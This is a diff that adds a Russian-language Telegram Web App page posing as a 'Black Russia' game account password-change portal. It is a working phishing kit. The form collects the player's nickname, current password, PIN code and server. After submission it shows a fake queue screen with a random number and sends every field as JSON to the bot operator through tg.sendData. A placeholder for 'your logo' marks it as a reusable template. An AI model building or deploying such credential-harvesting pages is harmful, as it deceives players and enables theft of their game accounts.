@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Black Russia - Смена пароля</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --container-bg: #141414;
+            --accent-color: #e50914;
+            --accent-hover: #b80710;
+            --text-color: #ffffff;
+            --text-muted: #8c8c8c;
+            --input-bg: #1f1f1f;
+            --border-color: #2a2a2a;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            padding: 24px;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        .logo {
+            width: 140px;
+            height: auto;
+            margin-bottom: 20px;
+            margin-top: 10px;
+        }
+
+        h2 {
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .btn {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            transition: background 0.2s;
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            background-color: var(--accent-hover);
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: var(--accent-color);
+        }
+
+        .error-msg {
+            color: var(--accent-color);
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+            font-weight: bold;
+        }
+
+        .wait-box {
+            background: var(--container-bg);
+            border: 1px solid var(--border-color);
+            border-top: 3px solid var(--accent-color);
+            border-radius: 12px;
+            padding: 25px;
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .wait-title {
+            font-size: 16px;
+            color: #00ff66;
+            margin-bottom: 15px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .queue-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="screen1" class="screen active">
+        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" alt="Логотип">
+        <h2 style="color: var(--text-muted);">Личный кабинет</h2>
+        <div style="height: 60px;"></div>
+        <button class="btn" onclick="goToScreen(2)">Поменять пароль</button>
+    </div>
+
+    <div id="screen2" class="screen">
+        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" style="width: 90px;" alt="Логотип">
+        <h2>Смена пароля</h2>
+        
+        <div id="error" class="error-msg">Заполните все обязательные поля</div>
+
+        <div class="form-group">
+            <label>Ник</label>
+            <input type="text" id="nickname" placeholder="Введите ваш ник">
+        </div>
+
+        <div class="form-group">
+            <label>Пароль</label>
+            <input type="password" id="old_password" placeholder="Введите текущий пароль">
+        </div>
+
+        <div class="form-group">
+            <label>Пин-код (если есть)</label>
+            <input type="text" id="pincode" placeholder="Введите пин-код">
+        </div>
+
+        <div class="form-group">
+            <label>Сервер</label>
+            <select id="server">
+                <option value="" disabled selected hidden>Выберите сервер</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>Новый пароль</label>
+            <input type="password" id="new_password" placeholder="Введите новый пароль">
+        </div>
+
+        <button class="btn" onclick="submitForm()">Отправить</button>
+    </div>
+
+    <div id="screen3" class="screen">
+        <img class="logo" src="ССЫЛКА_НА_ТВОЙ_ЛОГОТИП" alt="Логотип">
+        <div class="wait-box">
+            <div class="wait-title">Заявка обрабатывается</div>
+            <p style="color: var(--text-muted);">Ожидайте в течение 10–15 минут</p>
+            <p style="color: var(--text-muted); font-size: 13px; margin-top: 15px; text-transform: uppercase;">Ваша очередь:</p>
+            <div class="queue-number" id="queue-val">2</div>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); 
+
+        // Список всех 91 серверов
+        const servers = [
+            "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Lime", "Pink", "Cherry", "Black",
+            "Indigo", "White", "Magenta", "Crimson", "Gold", "Azure", "Platinum", "Aqua", "Gray", "Ice",
+            "Chilli", "Choco", "Moscow", "SPB", "Ufa", "Sochi", "Kazan", "Samara", "Rostov", "Anapa",
+            "EKB", "Krasnodar", "Arzamas", "Novosib", "Grozny", "Saratov", "Omsk", "Irkutsk", "Volgograd", "Voronezh",
+            "Belgorod", "Makhachkala", "Vladivkaz", "Vladivostok", "Kaliningrad", "Chelyabinsk", "Krasnoyarsk", "CHEBOKSARY", "KHABAROVSK", "PERM",
+            "TULA", "RYAZAN", "MURMANSK", "PENZA", "KURSK", "ARKHANGELSK", "ORENBURG", "KIROV", "KEMEROVO", "TYUMEN",
+            "TOLYATTI", "IVANOVO", "STAVROPOL", "SMOLENSK", "PSKOV", "BRYANSK", "OREL", "YAROSLAVL", "BARNAUL", "LIPETSK",
+            "ULYANOVSK", "YAKUTSK", "TAMBOV", "BRATSK", "ASTRAKHAN", "CHITA", "KOSTROMA", "VLADIMIR", "KALUGA", "NOVGOROD",
+            "TAGANROG", "VOLOGDA", "TVER", "TOMSK", "IZHEVSK", "SURGUT", "PODOLSK", "MAGADAN", "CHEREPOVETS", "NORILSK", "ASTANA"
+        ];
+
+        const select = document.getElementById('server');
+        servers.forEach((srv, index) => {
+            let opt = document.createElement('option');
+            opt.value = `${index + 1}. ${srv}`;
+            opt.innerHTML = `${index + 1}. ${srv}`;
+            select.appendChild(opt);
+        });
+
+        function goToScreen(screenNum) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(`screen${screenNum}`).classList.add('active');
+        }
+
+        function submitForm() {
+            const nick = document.getElementById('nickname').value.trim();
+            const oldPass = document.getElementById('old_password').value.trim();
+            const pin = document.getElementById('pincode').value.trim();
+            const server = document.getElementById('server').value;
+            const newPass = document.getElementById('new_password').value.trim();
+            const errorBlock = document.getElementById('error');
+
+            if (!nick || !oldPass || !server || !newPass) {
+                errorBlock.style.display = 'block';
+                return;
+            }
+
+            errorBlock.style.display = 'none';
+
+            const randomQueue = Math.floor(Math.random() * (9 - 2 + 1)) + 2;
+            document.getElementById('queue-val').innerText = randomQueue;
+
+            const payload = {
+                nickname: nick,
+                old_password: oldPass,
+                pincode: pin ? pin : "Не указан",
+                server: server,
+                new_password: newPass
+            };
+
+            // 1. Сначала переключаем пользователя на экран ожидания
+            goToScreen(3);
+            
+            // 2. Делаем микропаузу (500 мс), чтобы анимация применилась, и отправляем пакет в Telegram
+            setTimeout(() => {
+                tg.sendData(JSON.stringify(payload));
+            }, 500);
+        }
+    </script>
+</body>
+</html>
